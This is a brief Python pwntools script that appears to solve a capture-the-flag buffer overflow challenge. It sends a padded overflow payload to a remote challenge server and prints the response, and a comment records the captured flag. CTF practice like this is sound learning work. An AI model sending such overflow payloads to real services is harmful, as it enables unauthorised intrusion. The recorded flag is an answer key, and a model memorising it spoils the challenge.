from pwn import *
elf = context.binary = ELF("./chall")
# p = process()
p = remote("116.254.117.234",5203)
kata = b"SMKN7Semarang"
offset = 64 - len(kata)
payload = kata + b"\x00" * offset + b"A" * 16
p.sendline(payload)
print(p.recvall().strip().decode())

# Flag: STEMBACTF{L3arning_B0F_Is_N0t_D1ff1cult_Ri9ht??}